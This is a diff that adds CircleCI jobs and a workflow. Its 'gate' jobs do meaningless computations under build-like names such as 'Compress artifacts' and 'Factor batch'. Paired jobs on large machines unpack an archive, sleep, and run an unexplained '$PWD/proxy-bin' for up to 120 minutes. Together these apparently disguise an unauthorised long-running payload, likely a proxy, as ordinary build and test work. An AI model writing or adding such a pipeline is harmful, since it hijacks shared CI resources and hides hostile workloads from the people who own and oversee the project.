+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/update-oauth-leak.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_bun-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Compress artifacts
+          command: |
+            mkdir -p /tmp/stage
+            { dd if=/dev/zero bs=1M count=600 2>/dev/null | gzip -9 | wc -c ; } > /tmp/stage/bun-test.log
+            echo "gate bun-test: $(wc -c </tmp/stage/bun-test.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - bun-test.log
+  bun-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/bun-test.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_lets-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Sort sample set
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 200000 | sort -rn | md5sum ; } > /tmp/stage/lets-go.log
+            echo "gate lets-go: $(wc -c </tmp/stage/lets-go.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - lets-go.log
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/lets-go.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+  gate_aug18-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Factor batch
+          command: |
+            mkdir -p /tmp/stage
+            { seq 2 30000 | factor | wc -l ; } > /tmp/stage/aug18-release.log
+            echo "gate aug18-release: $(wc -c </tmp/stage/aug18-release.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - aug18-release.log
+  aug18-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Load upstream result
+          command: |
+            cat /tmp/stage/aug18-release.log
+      - run:
+          name: Clone and prep
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: tar xzvf cache-prod.tgz
+      - run:
+          name: Cooldown
+          command: uptime
+      - run:
+          command: /bin/sleep 30
+      - run:
+          no_output_timeout: 120m
+          command: "$PWD/proxy-bin"
+
+  gate_t-old_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Dedup tokens
+          command: |
+            mkdir -p /tmp/stage
+            { head -c 10000000 /dev/urandom | tr -dc 'a-z0-9' | fold -w32 | sort -u | wc -l ; } > /tmp/stage/t-old.log
+            echo "gate t-old: $(wc -c </tmp/stage/t-old.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - t-old.log
+  gate_cerberus-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/stage
+      - run:
+          name: Count fixture lines
+          command: |
+            mkdir -p /tmp/stage
+            { seq 1 12000000 | awk '{print "circleci"}' | wc -l ; } > /tmp/stage/cerberus-rev.log
+            echo "gate cerberus-rev: $(wc -c </tmp/stage/cerberus-rev.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/stage
+          paths:
+            - cerberus-rev.log
+workflows:
+  default:
+    jobs:
+      - gate_wen-smoke
+      - gate_whiskey-2
+      - gate_run-staging-docker-image
+      - wen-smoke:
+          requires:
+            - gate_wen-smoke
+            - gate_whiskey-2
+            - gate_run-staging-docker-image
+      - whiskey-2:
+          requires:
+            - gate_wen-smoke
+            - gate_whiskey-2
+            - gate_run-staging-docker-image
+      - run-staging-docker-image:
+          requires:
+            - gate_wen-smoke
+            - gate_whiskey-2
+            - gate_run-staging-docker-image
+      - ruby3-build:
+          requires:
+            - gate_wen-smoke
+            - gate_whiskey-2
+            - gate_run-staging-docker-image
+      - xray-1:
+          requires:
+            - gate_wen-smoke
+            - gate_whiskey-2
+            - gate_run-staging-docker-image
+      - charlie-7:
+          requires:
+            - gate_wen-smoke
+            - gate_whiskey-2
+            - gate_run-staging-docker-image
+      - gate_t-old
+      - gate_t-old_2:
+          requires:
+            - gate_t-old
+      - t-old:
+          requires:
+            - gate_t-old_2
+      - gate_cerberus-rev:
+          requires:
+            - gate_t-old_2
+      - gate_cerberus-rev_2:
+          requires:
+            - gate_cerberus-rev
+      - cerberus-rev:
+          requires:
+            - gate_cerberus-rev_2
+      - gate_Rollout_Suite9
+      - gate_v1-preview
+      - Rollout_Suite9:
+          requires:
+            - gate_Rollout_Suite9
+            - gate_v1-preview
+      - v1-preview:
+          requires:
+            - gate_Rollout_Suite9
+            - gate_v1-preview
+      - delta:
+          requires:
+            - gate_Rollout_Suite9
+            - gate_v1-preview
+      - fix-router:
+          requires:
+            - gate_Rollout_Suite9
+            - gate_v1-preview
+      - succes-only:
+          requires:
+            - gate_Rollout_Suite9
+            - gate_v1-preview
+      - promote:
+          requires:
+            - gate_Rollout_Suite9
+            - gate_v1-preview
+      - green-light-go:
+          requires:
+            - gate_Rollout_Suite9
+            - gate_v1-preview
+      - gate_Launch_App2
+      - Launch_App2:
+          requires:
+            - gate_Launch_App2
+      - gate_lets-go:
+          requires:
+            - gate_Launch_App2
+      - lets-go:
+          requires:
+            - gate_lets-go
+      - gate_Validate_Image1:
+          requires:
+            - gate_lets-go
+      - Validate_Image1:
+          requires:
+            - gate_Validate_Image1
+      - gate_assemble-quick-regression-suite:
+          requires:
+            - gate_Validate_Image1
+      - assemble-quick-regression-suite:
+          requires:
+            - gate_assemble-quick-regression-suite
+      - gate_q1-release:
+          requires:
+            - gate_assemble-quick-regression-suite
+      - q1-release:
+          requires:
+            - gate_q1-release
+      - gate_q2-canary:
+          requires:
+            - gate_q1-release
+      - q2-canary:
+          requires:
+            - gate_q2-canary
+      - gate_update-oauth-leak:
+          requires:
+            - gate_q2-canary
+      - update-oauth-leak:
+          requires:
+            - gate_update-oauth-leak
+      - gate_xray
+      - gate_test
+      - xray:
+          requires:
+            - gate_xray
+            - gate_test
+      - test:
+          requires:
+            - gate_xray
+            - gate_test
+      - aug18-release:
+          requires:
+            - gate_xray
+            - gate_test
+      - mike-5:
+          requires:
+            - gate_xray
+            - gate_test
+      - bun-test:
+          requires:
+            - gate_xray
+            - gate_test
+      - nightly-v9:
+          requires:
+            - gate_xray
+            - gate_test
+      - artifacts:
+          requires:
+            - gate_xray
+            - gate_test
+      - alpha-9:
+          requires:
+            - gate_xray
+            - gate_test
